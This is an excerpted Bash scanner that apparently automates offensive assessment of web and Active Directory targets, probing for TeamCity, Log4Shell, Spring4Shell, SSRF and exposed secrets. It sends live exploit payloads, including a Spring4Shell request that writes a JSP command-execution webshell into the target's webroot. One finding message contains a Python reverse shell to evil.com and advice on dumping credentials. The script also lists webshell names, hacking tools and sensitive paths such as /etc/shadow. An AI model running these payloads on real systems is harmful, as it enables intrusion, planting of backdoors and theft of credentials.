    # ── CVE-2024-27198/27199 ─ TeamCity Auth Bypass ──────────────────────────
    if echo "$OPEN_PORTS" | grep -qiE "(^|,)(8111|8112)(,|$)"; then
        for web_url in "${WEB_TARGETS[@]:0:5}"; do
            _is_valid_url "$web_url" || continue
            local tc_check; tc_check=$(curl -s --max-time 10 \
                "${web_url}/app/rest/users;.jsp" -o /dev/null -w "%{http_code}" 2>/dev/null || echo "000")
            echo "CVE-2024-27198 probe: HTTP ${tc_check}" > "${cve_dir}/CVE-2024-27198.txt"
            if [[ "$tc_check" =~ ^(200|400)$ ]]; then
    ...
    # ── CVE-2024-8190 / CVE-2025-0282 ─ Ivanti ──────────────────────────────
    for web_url in "${WEB_TARGETS[@]:0:5}"; do
        _is_valid_url "$web_url" || continue
        local ivanti_check; ivanti_check=$(( $( curl -s --max-time 10 --max-filesize 51200 "${web_url}" 2>/dev/null \
    ...
    # ── CVE-2024-38063 ─ Windows IPv6 RCE (network check) ───────────────────
    # Only if target appears to be Windows (from nmap OS detection)
    # Strict Windows check: require OS detection output, not just any mention of Windows/Microsoft
    if grep -qiE "^OS:|Running:.*Windows|OS details:.*Windows" "${OUTPUT_DIR}/nmap/nmap_os.txt" 2>/dev/null; then
        add_vuln "MEDIUM" "CVE-2024-38063: Windows IPv6 TCP/IP RCE — Patch Level Unverified" \
    ...
    # ── CVE-2024-49039 ─ Windows Task Scheduler EoP ──────────────────────────
    if grep -qiE "^OS:|Running:.*Windows|OS details:.*Windows" "${OUTPUT_DIR}/nmap/nmap_os.txt" 2>/dev/null; then
        add_vuln "MEDIUM" "CVE-2024-49039: Windows Task Scheduler EoP — Patch Level Unverified" \
    ...
    if grep -qiE "^OS:|Running:.*Windows|OS details:.*Windows" "${OUTPUT_DIR}/nmap/nmap_os.txt" 2>/dev/null; then
        add_vuln "MEDIUM" "CVE-2025-21298: Windows OLE RCE — Patch Level Unverified" \
    ...
    if grep -qiE "^OS:|Running:.*Windows|OS details:.*Windows|Microsoft-IIS" "${OUTPUT_DIR}/nmap/nmap_os.txt" 2>/dev/null; then
        add_vuln "MEDIUM" "CVE-2024-43451: Windows NTLM Hash Disclosure Spoofing" \
    ...
    # ── Log4Shell (CVE-2021-44228) re-check ─ still widely unpatched ────────
    # BUG FIX: log4j_payload must stay unexpanded — use single-quoted variable and
    # pass to curl via --header to avoid bash ${ } interpolation in double-quoted strings
    # Build Log4Shell payload using interactsh URL if running, else canary
    local log4j_host; log4j_host="${INTERACTSH_URL:-acromap-canary.invalid}"
    local log4j_payload; log4j_payload='${jndi:ldap://'"${log4j_host}"'/a}'
    : > "${cve_dir}/CVE-2021-44228.txt"   # truncate once before loop
    for web_url in "${WEB_TARGETS[@]:0:5}"; do
        _is_valid_url "$web_url" || continue
        local log4j_resp; log4j_resp=$(curl -s --max-time 10 \
            --header "X-Api-Version: ${log4j_payload}" \
            --header "User-Agent: ${log4j_payload}" \
            "${web_url}" -o /dev/null -w "%{http_code}" 2>/dev/null || echo "000")
        echo "Log4Shell probe [${web_url}]: HTTP ${log4j_resp}" >> "${cve_dir}/CVE-2021-44228.txt"
        # Note: true confirmation requires out-of-band LDAP callback — HTTP code is passive only
    done

    # ── Spring4Shell (CVE-2022-22965) ────────────────────────────────────────
    for web_url in "${WEB_TARGETS[@]:0:5}"; do
        _is_valid_url "$web_url" || continue
        local spring_resp; spring_resp=$(curl -s --max-time 10 -X POST \
            "${web_url}/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20Runtime.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps%2FROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=" \
            -o /dev/null -w "%{http_code}" 2>/dev/null || echo "000")
        local spring_check; spring_check=$(( $( curl -s --max-time 10 --max-filesize 51200 "${web_url}" 2>/dev/null \
            | head -c 4096 | grep -ci "Spring\|springframework" | tr -d '\n' 2>/dev/null || echo 0) + 0 ))
        # BUG FIX: HTTP 200 alone is too broad — any site returns 200.
...
phase_post_exploit() {
    ...
    mkdir -p "$pe_dir" 2>/dev/null || true   # BUG FIX: pe_dir used for writes but mkdir was missing

    log_section "Post-exploitation indicator checks (remote fingerprinting)..."

    # Check for exposed LinPEAS/WinPEAS download paths (indicators of previous attack)
    for web_url in "${WEB_TARGETS[@]:0:3}"; do
        _is_valid_url "$web_url" || continue
        for suspicious in "linpeas.sh" "winpeas.exe" "mimikatz.exe" "nc.exe" "shell.php" \
                          "cmd.php" "webshell.php" "c99.php" "r57.php" "b374k.php"; do
            local susp_resp; susp_resp=$(curl -s -o /dev/null -w "%{http_code}" --max-time 8 \
                "${web_url}/${suspicious}" 2>/dev/null || echo "000")
            if [[ "$susp_resp" == "200" ]]; then
                add_vuln "CRITICAL" "Webshell/Post-Exploit Tool Found: ${suspicious}" \
                    "Post-exploitation tool or webshell found in web root — may indicate prior compromise." \
                    "Remove file immediately. Conduct full forensic investigation. Rotate all credentials." \
                    "${web_url}/${suspicious} — HTTP 200" \
                    "EXPLOIT: curl ${web_url}/${suspicious}?cmd=id → OS command execution. Escalate: cmd=python3+-c+'import+socket,subprocess,os;s=socket.socket();s.connect(("evil.com",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["/bin/sh"])' → reverse shell. From shell: cat /etc/passwd; find / -name *.conf 2>/dev/null; dump database credentials." \
                    "PATCH: 1) IMMEDIATELY: rm -f $(find /var/www -name '${suspicious}' 2>/dev/null). 2) Incident response checklist: preserve disk image for forensics. 3) Rotate ALL credentials (DB, SSH keys, API keys, cloud). 4) Check crontabs: crontab -l; cat /etc/cron*/*. 5) Check new users: awk -F: '\$3>=1000' /etc/passwd. 6) Rebuild server from known-good image if compromise confirmed."
            fi
        done
    done

    # Check for web shells in common locations
    local webshell_paths=("/shell.php" "/cmd.php" "/phpinfo.php" "/info.php" \
                          "/test.php" "/php-info.php" "/uploads/shell.php" "/images/shell.php")
    for web_url in "${WEB_TARGETS[@]:0:3}"; do
        _is_valid_url "$web_url" || continue
        for ws_path in "${webshell_paths[@]}"; do
            local ws_body; ws_body=$(curl -s --max-time 8 --max-filesize 51200 "${web_url}${ws_path}" 2>/dev/null \
                | head -c 4096)
            local ws_shell; ws_shell=0; { _wsc=$(echo "$ws_body" | grep -ciE "eval\(|system\(|exec\(|passthru\(|shell_exec\(" 2>/dev/null) && ws_shell=$(( _wsc + 0 )); } 2>/dev/null || true
            local ws_info;  ws_info=0; { _wsi=$(echo "$ws_body" | grep -ciE "phpinfo\(\)|PHP Version" 2>/dev/null) && ws_info=$(( _wsi + 0 )); } 2>/dev/null || true
            if [[ ${ws_shell:-0} -gt 0 ]]; then
                add_vuln "CRITICAL" "Potential Webshell/Backdoor: ${ws_path}" \
                    "File at ${ws_path} contains PHP shell function calls typical of webshells." \
                    "Investigate immediately. Remove suspicious files. Check file modification dates." \
                    "${web_url}${ws_path} — webshell function found"
            elif [[ ${ws_info:-0} -gt 0 ]]; then
                add_vuln "MEDIUM" "PHP Info Page Exposed: ${ws_path}" \
                    "phpinfo() page reveals PHP configuration, loaded modules, and environment variables to attackers." \
                    "Remove phpinfo files from production. Restrict access to info pages." \
                    "${web_url}${ws_path} — phpinfo exposed"
            fi
        done
    done

    # Check for phpmyadmin / phppgadmin (DB admin exposed)
    for web_url in "${WEB_TARGETS[@]:0:3}"; do
        _is_valid_url "$web_url" || continue
        for db_admin in "/phpmyadmin" "/phppgadmin" "/adminer.php" "/dbadmin" "/pma" "/mysql"; do
            local dba_resp; dba_resp=$(curl -s -o /dev/null -w "%{http_code}" --max-time 8 \
                "${web_url}${db_admin}" 2>/dev/null || echo "000")
            if [[ "$dba_resp" == "200" ]]; then
                add_vuln "HIGH" "Database Admin Interface Exposed: ${db_admin}" \
                    "Database administration interface accessible from internet — brute-force and data theft risk." \
                    "Restrict access by IP. Require VPN. Disable external access." \
                    "${web_url}${db_admin} — HTTP ${dba_resp}"
            fi
        done
    done
    ...
    for web_url in "${WEB_TARGETS[@]:0:3}"; do
        ...
        local sensitive_files=(
            ...
            "/etc/passwd" "/etc/shadow" "/proc/version" "/proc/self/environ"
            "/var/log/apache2/access.log" "/windows/win.ini" "/boot.ini"
            "/composer.json" "/package.json" "/Gemfile" "/.gitconfig"
            "/server-status" "/server-info" "/.htaccess" "/web.config"
        )
        for sfile in "${sensitive_files[@]}"; do
            # BUG FIX: no size limit — add --max-filesize 50K to cap downloads on each path
            local sf_resp; sf_resp=$(curl -s --max-time 8 --max-filesize 51200 \
                "${web_url}${sfile}" 2>/dev/null | head -c 2048 || echo "")
            if echo "$sf_resp" | grep -qiE "root:x:|WINDOWS|aws_|PRIVATE KEY|DB_PASSWORD|SECRET_KEY"; then
                add_vuln "CRITICAL" "Sensitive File Accessible: ${sfile}" \
                    "Sensitive file is directly accessible via HTTP — credentials, keys, or system info exposed." \
                    "Block access to sensitive files via web server configuration. Move outside web root." \
                    "${web_url}${sfile} — sensitive content detected"
            fi
        done
    done
        ...
        if [[ -n "$krb_domain" ]] && [[ "$_krb_port_open" == "true" ]]; then
            ...
            if [[ -f "${spray_dir}/kerbrute_users.txt" ]] && \
               grep -q "VALID" "${spray_dir}/kerbrute_users.txt" 2>/dev/null; then
                ...
                local valid_count; valid_count=$(( $(wc -l < "${spray_dir}/valid_users.txt" 2>/dev/null || echo 0) + 0 ))
...
phase_ssrf_deep() {
    ...
    for web_url in "${WEB_TARGETS[@]:0:3}"; do
        ...
        for param in "${ssrf_params[@]}"; do
            ...
            local meta_resp; meta_resp=$(curl -s --max-time 8 \
                "${web_url}?${param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
                2>/dev/null | head -c 512 || echo "")
            if echo "$meta_resp" | grep -qiE "AccessKeyId|ami-id|instance-id|iam/"; then
                add_vuln "CRITICAL" "SSRF → AWS Metadata via param:${param} (${web_url})" \
                    "SSRF exploited via parameter '${param}' reached AWS IMDS. IAM credentials may be exposed." \
                    "Implement SSRF filter. Block 169.254.0.0/16. Use IMDSv2 with session tokens." \
                    "${web_url}?${param}=http://169.254.169.254/... — AWS metadata returned"
                ssrf_hits=$(( ssrf_hits + 1 ))
                break
            fi

            # OOB SSRF probe (blind — requires interactsh callback)
            if [[ -n "$INTERACTSH_URL" ]]; then
                curl -s --max-time 8 \
                    "${web_url}?${param}=${oob_url}/${param}" \
                    -o /dev/null 2>/dev/null || true
            fi
        done

        # ── Protocol smuggling probes ───────────────────────────────────────
        log_section "Protocol smuggling probes (gopher/dict/file)..."
        ...
        for proto_url in "${proto_payloads[@]}"; do
            local proto_resp; proto_resp=$(curl -s --max-time 8 \
                "${web_url}?url=${proto_url}&redirect=${proto_url}&fetch=${proto_url}" \
                2>/dev/null | head -c 512 || echo "")
            if echo "$proto_resp" | grep -qiE "root:x:|PONG|\+OK|250 EHLO|memcached"; then
                local proto_name; proto_name=$(echo "$proto_url" | cut -d: -f1)
                add_vuln "CRITICAL" "SSRF Protocol Smuggling via ${proto_name^^} (${web_url})" \
                    "SSRF allows ${proto_name^^} protocol smuggling to internal services. Enables Redis/Memcached command injection, SMTP relay, or local file read." \
                    "Block non-HTTP protocols in SSRF filter. Whitelist allowed URL schemes (http/https only)." \
                    "${proto_name}:// probe returned internal service response"
                ssrf_hits=$(( ssrf_hits + 1 ))
            fi
        done
    ...
    # ── Check interactsh for OOB callbacks ────────────────────────────────────
    if [[ -n "$INTERACTSH_URL" ]] && [[ -s "${OUTPUT_DIR}/raw_logs/interactsh.json" ]]; then
        # No sleep — interactsh-client writes callbacks in real time to the JSON file.
        # We already probed above; just read what arrived so far.
        local oob_hits; oob_hits=$(( $(grep -cE "ssrf-canary|${INTERACTSH_URL}" \
            "${OUTPUT_DIR}/raw_logs/interactsh.json" 2>/dev/null || echo 0) + 0 ))
        if [[ ${oob_hits:-0} -gt 0 ]]; then
            add_vuln "CRITICAL" "Blind SSRF Confirmed via OOB DNS Callback" \
                "Out-of-band DNS callback received from target server — blind SSRF is confirmed even without visible response." \
                "Block all SSRF via egress filtering. Validate and whitelist allowed external URLs." \
                "interactsh received ${oob_hits} callback(s) from ${TARGET}"
        fi
    fi
            ...
            if command -v trufflehog &>/dev/null && [[ -d "$git_dump_dir" ]]; then
                ...
                if [[ -s "${sec_dir}/trufflehog_${slug}.txt" ]]; then
                    local secrets_found; secrets_found=$(( $(grep -c '"DetectorName"' \
                        "${sec_dir}/trufflehog_${slug}.txt" 2>/dev/null || echo 0) + 0 ))
        ...
        if [[ "$web_url" == "${WEB_TARGETS[0]:-}" ]] &&            command -v trufflehog &>/dev/null && [[ "$SCAN_PROFILE" != "quick" ]]; then
            ...
            if [[ -d "$tf_scan_dir" ]]; then
                ...
                if [[ -s "${sec_dir}/trufflehog_http_${slug}.txt" ]]; then
                    local http_secrets; http_secrets=$(( $(grep -c '"DetectorName"' "${sec_dir}/trufflehog_http_${slug}.txt" 2>/dev/null || echo 0) + 0 ))
                    [[ ${http_secrets:-0} -gt 0 ]] && \
...
phase_ad_deep() {
    ...
    if [[ -n "$impacket_spns" ]]; then
        ...
        if grep -qE "\$krb5tgs\$" "${ad_dir}/spns.txt" 2>/dev/null; then
            local spn_count; spn_count=$(( $(grep -c "\$krb5tgs\$" "${ad_dir}/spns.txt" 2>/dev/null || echo 0) + 0 ))
    ...
    if [[ "$has_certipy" == true ]] && [[ "$TARGET_TYPE" == "DOMAIN" ]] && \
       echo "$OPEN_PORTS" | grep -qE "(^|,)(443|389|636)(,|$)"; then
        ...
        if grep -qiE "ESC[1-8]|vulnerable|Enabled.*True" "${ad_dir}/certipy.txt" 2>/dev/null; then
            local esc_count; esc_count=$(( $(grep -cE "ESC[1-8]" "${ad_dir}/certipy.txt" 2>/dev/null || echo 0) + 0 ))
...
phase_zero_day_one_click() {
    ...
    if grep -qiE "^OS details:.*Windows|Running:.*Windows" "${OUTPUT_DIR}/nmap/nmap_os.txt" 2>/dev/null; then
        add_vuln "ZERO_DAY" \
    ...
    if [[ -s "$takeover_file" ]]; then
        local td_count; td_count=$(( $(wc -l < "$takeover_file" 2>/dev/null || echo 0) + 0 ))
...
phase_cidr_sweep() {
    ...
    local live_count; live_count=$(( $(wc -l < "$live_hosts_file" 2>/dev/null || echo 0) + 0 ))
    ...
    if [[ -f "${cidr_dir}/nmap_cidr_grep.txt" ]]; then
        ...
        local interesting; interesting=$(( $(wc -l < "${cidr_dir}/hosts_with_open_ports.txt" 2>/dev/null || echo 0) + 0 ))
